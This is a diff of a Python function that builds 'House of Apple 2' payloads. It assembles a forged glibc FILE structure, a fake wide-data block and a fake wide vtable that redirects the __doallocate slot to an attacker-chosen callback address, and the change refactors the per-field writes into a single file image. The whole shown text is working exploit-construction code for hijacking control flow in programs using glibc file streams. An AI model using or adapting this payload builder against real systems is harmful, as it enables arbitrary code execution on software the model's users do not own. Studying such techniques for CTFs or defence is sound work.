@@ -123,49 +123,52 @@ def build_house_of_apple2(
     for name, value in addresses.items():
         _check_uint(name, value)
 
-    if current_flags is None:
-        flags_write = None
-    else:
+    file_image = bytearray(FILE_SIZE)
+    if current_flags is not None:
         _check_uint("current_flags", current_flags, 32)
         flags = current_flags & ~_CLEAR_FOR_WIDE_OVERFLOW
-        flags_write = _write(
-            file_addr + FILE_FLAGS,
-            flags.to_bytes(4, "little"),
-            "FILE._flags",
-        )
+        file_image[FILE_FLAGS:FILE_FLAGS + 4] = flags.to_bytes(4, "little")
 
-    file_writes = [
-        _write(file_addr + FILE_WIDE_DATA, _ptr(fake_wide_data_addr, "fake_wide_data_addr"), "FILE._wide_data"),
-        _write(file_addr + FILE_VTABLE, _ptr(wfile_jumps_addr, "wfile_jumps_addr"), "FILE.vtable"),
-        _write(file_addr + FILE_MODE, (1).to_bytes(4, "little"), "FILE._mode"),
-        _write(file_addr + FILE_READ_BASE, _ptr(narrow_buffer_addr, "narrow_buffer_addr"), "FILE._IO_read_base"),
-        _write(file_addr + FILE_READ_PTR, _ptr(narrow_buffer_addr, "narrow_buffer_addr"), "FILE._IO_read_ptr"),
-        _write(file_addr + FILE_READ_END, _ptr(narrow_buffer_addr, "narrow_buffer_addr"), "FILE._IO_read_end"),
-        _write(file_addr + FILE_WRITE_BASE, _ptr(narrow_buffer_addr, "narrow_buffer_addr"), "FILE._IO_write_base"),
-        _write(file_addr + FILE_WRITE_PTR, _ptr(narrow_buffer_addr, "narrow_buffer_addr"), "FILE._IO_write_ptr"),
-        _write(file_addr + FILE_WRITE_END, _ptr(narrow_buffer_addr + 0x20, "narrow_buffer_end"), "FILE._IO_write_end"),
-        _write(file_addr + FILE_BUF_BASE, _ptr(narrow_buffer_addr, "narrow_buffer_addr"), "FILE._IO_buf_base"),
-        _write(file_addr + FILE_BUF_END, _ptr(narrow_buffer_addr + 0x20, "narrow_buffer_end"), "FILE._IO_buf_end"),
-    ]
-    if flags_write is not None:
-        file_writes.insert(0, flags_write)
+    fields = (
+        (FILE_WIDE_DATA, _ptr(fake_wide_data_addr, "fake_wide_data_addr")),
+        (FILE_VTABLE, _ptr(wfile_jumps_addr, "wfile_jumps_addr")),
+        (FILE_MODE, (1).to_bytes(4, "little")),
+        (FILE_READ_BASE, _ptr(narrow_buffer_addr, "narrow_buffer_addr")),
+        (FILE_READ_PTR, _ptr(narrow_buffer_addr, "narrow_buffer_addr")),
+        (FILE_READ_END, _ptr(narrow_buffer_addr, "narrow_buffer_addr")),
+        (FILE_WRITE_BASE, _ptr(narrow_buffer_addr, "narrow_buffer_addr")),
+        (FILE_WRITE_PTR, _ptr(narrow_buffer_addr, "narrow_buffer_addr")),
+        (FILE_WRITE_END, _ptr(narrow_buffer_addr + 0x20, "narrow_buffer_end")),
+        (FILE_BUF_BASE, _ptr(narrow_buffer_addr, "narrow_buffer_addr")),
+        (FILE_BUF_END, _ptr(narrow_buffer_addr + 0x20, "narrow_buffer_end")),
+    )
+    for offset, data in fields:
+        file_image[offset:offset + len(data)] = data
 
     wide_size = wide_vtable_offset + 8
     wide_vtable_size = DOALLOCATE_SLOT + 8
-    return tuple(
-        file_writes
-        + [
-            _write(
-                fake_wide_data_addr,
-                _qword_image(wide_size, wide_vtable_offset, fake_wide_vtable_addr, "wide_vtable"),
-                f"fake wide_data ({version})",
-            ),
-            _write(
+    return (
+        _write(file_addr, bytes(file_image), f"FILE ({version})"),
+        _write(
+            fake_wide_data_addr,
+            _qword_image(
+                wide_size,
+                wide_vtable_offset,
                 fake_wide_vtable_addr,
-                _qword_image(wide_vtable_size, DOALLOCATE_SLOT, callback_addr, "callback_addr"),
-                "fake wide_vtable.__doallocate",
+                "wide_vtable",
             ),
-        ]
+            f"fake wide_data ({version})",
+        ),
+        _write(
+            fake_wide_vtable_addr,
+            _qword_image(
+                wide_vtable_size,
+                DOALLOCATE_SLOT,
+                callback_addr,
+                "callback_addr",
+            ),
+            "fake wide_vtable.__doallocate",
+        ),
     )
 
 
